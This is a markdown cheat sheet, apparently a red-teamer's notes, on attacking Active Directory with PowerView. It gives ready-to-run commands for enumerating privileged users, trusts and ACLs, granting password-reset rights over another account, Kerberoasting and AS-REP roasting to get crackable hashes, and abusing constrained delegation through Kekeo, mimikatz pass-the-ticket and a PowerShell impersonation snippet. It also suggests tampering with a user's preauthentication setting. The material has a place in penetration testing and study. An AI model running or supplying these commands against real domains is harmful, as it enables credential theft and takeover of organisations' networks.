# PowerView Enumeration

Remember to clone the dev branch!

https://powersploit.readthedocs.io/en/latest/Recon/

https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon

https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

## Some PowerView Basics

`-Properties` : samaccountname,lastlogon, using -FindOne to first determine the property names you want to extract.

`-Identity` : Accepts not just a samAccountName, but also distinguishedName, GUID, object SID, and dnsHostName in the computer case.

## Begining Enumeration

http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/

## Users and Groups

Get all the groups a user is effectively a member of, 'recursing up' using tokenGroups:

`Get-DomainGroup -MemberIdentity <User/Group>`

Get all the effective members of a group, 'recursing down':

`Get-DomainGroupMember -Identity "Domain Admins" -Recurse`

Get all enabled users, returning distinguishednames:

`Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname`

`Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname`

Get all disabled users:

`Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)"`

`Get-DomainUser -UACFilter ACCOUNTDISABLE`

### Domain Trusts

* `Get-NetForestDomains` : See all the domains in the current forest.
* `Get-NetDomainTrusts` : See what domain trusts I can currently see (à la nltest).
* `Get-NetForestTrusts` : See if there are any implicit forest trusts.
* `Get-DomainTrustMapping | Export-CSV -NoTypeInformation trusts.csv`

Trusted domain objects are replicated in the global catalog, so we can enumerate every single internal and external trust that all domains in our current forest have extremely quickly, and only with traffic to our current PDC by running:

`Get-DomainTrust -SearchBase “GC://$($ENV:USERDNSDOMAIN)”`

Harmj0y's TrustVisualizer can take the trusts.csv and make a graph:

https://github.com/HarmJ0y/TrustVisualizer

 **Green** edges mean “within forest”
 **Red** means external
 **Blue** means inter-forest trust relationships

### High Value Users

With PowerView 2.0, you can now easily enumerate all users and groups where AdminCount=1 with:

`Get-DomainUser -AdminCount and Get-NetGroup -AdminCount`

This lets you quickly find all high value accounts, even if they’ve been moved out of a protected group. `Invoke-UserHunter` now also accepts an `-AdminCount` flag, letting you easily hunt for all high valued users in the domain.

### ACL Access Between Objects

Use PowerView to list ACLs for a specified user (using SID):

`Get-DomainObjectAcl -Credential $Creds | ? { ($_.SecurityIdentifier -Match '^<SID>') -and ($_.ActiveDirectoryRights -Match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}`

This gets the ACLs for the provided user credentials and pipes the results into a filter looking for the provided SID and various interesting privileges. The SID will usually reference a group.

Get SIDs using:

`Convert-NameToSid <USERNAME>`

Enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names:

`Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local`

Grant user 'will' the rights to change 'matt's password:

`Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose`

### Computers

Turn a list of computer short names to FQDNs, using a global catalog:

`gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname}`

## Token Impersonation

http://www.harmj0y.net/blog/powershell/make-powerview-great-again/

Version 2 of powershell.exe starts in a multi-threaded apartment state, while Version 3+ starts in a single-threaded apartment state. The LogonUser() call works in both situations, but when you try to call ImpersonateLoggedOnUser() to impersonate the loggedon user token in Version 2, the call succeeds but the newly-impersonated token isn’t applied to newly spawned actions and we don’t get our alternate user context. PowerShell v3 and up is fine, and you can force PowerShell Version 2 to launch in a single-threaded apartment state with `powershell.exe -sta`, but it’s still potentially problematic.

Note: This can be a problem when using a remote PSSession. Keep this in mind.

### Setting Creds

Option A, create some PSCredentials manually:

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred
```

Option B, prompt for username and password:

`$Cred = Get-Credential`

## Kerberoasting

PowerView's dev branch contains Invoke-Kerberoast, so no need to fetch it from another repo, like Empire. Invoke-Kerberoast "wraps the logic from Get-NetUser -SPN (to enumerate user accounts with a non-null servicePrincipalName) and Get-SPNTicket to request associated TGS tickets."

https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/

A very basic Kerberoast:

`Invoke-Keberoast | fl`

Specifying a domain, requesting only potentially privileged users, and outputting to Hashcat:

`Invoke-Keberoast -AdminCount -Domain contoso.local -OutputFormat Hashcat | fl`

"Note that the -AdminCount flag only Kerberoasts accounts with AdminCount=1, meaning user accounts that are (or were) ‘protected’ and, therefore, almost always highly privileged."

Alternative method: Using `Get-DomainUser -SPN` to get all domain users with an SPN. Then pipe the results into a call to `Get-DomainSPNTicket` to request the SPN for each user. Finally, export the results to a CSV file instead of stdout.

`Get-Domainuser -Credential $Credential -Server dc01.contoso.local -SPN | Get-DomainSPNTicket -Credential $Credential -OutputFormat Hashcat | Export-Csv C:\Users\Administrator\Desktop\spns.csv –NoTypeInformation`

Find all service accounts in "Domain Admins":

`Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}`

### Targeted Kerberoasting

Kerberoast any users in a particular OU with SPNs set:

`Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"`

### Roasting AS-REPs

https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/

If you can enumerate any accounts in a Windows domain that don’t require Kerberos preauthentication, you can now easily request a piece of encrypted information for said accounts and efficiently crack the material offline, revealing the user’s password.

Check for users who don't have kerberos preauthentication set:

`Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose`

`Get-DomainUser -UACFilter DONT_REQ_PREAUTH`

Note: If you have GenericWrite/GenericAll rights over a target user, you can maliciously modify their userAccountControl to not require preauth, use ASREPRoast, and then reset the value.

Now switch from PowerView to ASREPRoast:

https://github.com/HarmJ0y/ASREPRoast

`Get-ASREPHash -UserName victim -Domain contoso.local -Verbose`

"The final useful function in ASREPRoast is Invoke-ASREPRoast. If run from a domain authenticated, but otherwise unprivileged, user context in a Windows Kerberos environment, this function will first enumerate all users who have “Do not require Kerberos preauthentication” set in their user account control settings by using the LDAP filter (userAccountControl:1.2.840.113556.1.4.803:=4194304). For each user returned Get-ASREPHash is used to return a crackable hash."

`Invoke-ASREPRoast -Verbose`

### S4U2 & Delegation

http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/

https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/

First, enumerate all computers and users with a non-null msds-allowedtodelegateto field set. Find any users/computers with constrained delegation set:

`Get-DomainUser -TrustedToAuth`

`Get-DomainComputer -TrustedToAuth`

Filtered and verbose: `Get-DomainComputer -TrustedToAuth -Properties distinguishedname,msds-alloweddelegateto,useraccountcontrol -Verbose | fl`

Enumerate all servers that allow unconstrained delegation (userAccountControl attribute containing ADS_UF_TRUSTED_FOR_DELEGATION), and all privileged users that aren't marked as sensitive/not for delegation:

`Get-DomainComputer -Unconstrained`

`Get-DomainUser -AllowDelegation -AdminCount`

Hunt for admin users that allow delegation, logged into servers that allow unconstrained delegation:

`Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation`

Now, remember that a machine or user account with a SPN set under msds-allowedtodelegateto can pretend to be any user they want to the target service SPN.

**Scenario 1 - User Account Configured For Constrained Delegation**

Use Kekeo or Linux tools with a user account and a known plaintext password or NTLM hash to request a TGT, execute S4U TGS request, and access the service.

`asktgt.exe /user:SQLService /domain:testlab.local /password:Password1 /ticket:sqlservice.kirbi`

`s4u.exe /tgt:sqlservice.kirbi /user:Administrator@testlab.local /service:cifs/PRIMARY.testlab.local`

`mimikatz.exe "kerberos:ptt" "cifs.PRIMARY.testlab.local.kirbi" "exit"`

Finally, access the target as the Admin: `dir \\PRIMARY.testlab.local\C$`

**Scenario 2 - Same as 1, but with a computer account**

Get SYSTEM and take on the privileges of the computer account.

```
# load the necessary assembly
$Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
 
# execute S4U2Self w/ WindowsIdentity to request a forwardable TGS for the specified user
$Ident = New-Object System.Security.Principal.WindowsIdentity @('Administrator@TESTLAB.LOCAL')
 
# actually impersonate the next context
$Context = $Ident.Impersonate()
 
# implicitly invoke S4U2Proxy with the specified action
ls \\PRIMARY.TESTLAB.LOCAL\C$
 
# undo the impersonation context
$Context.Undo()
```

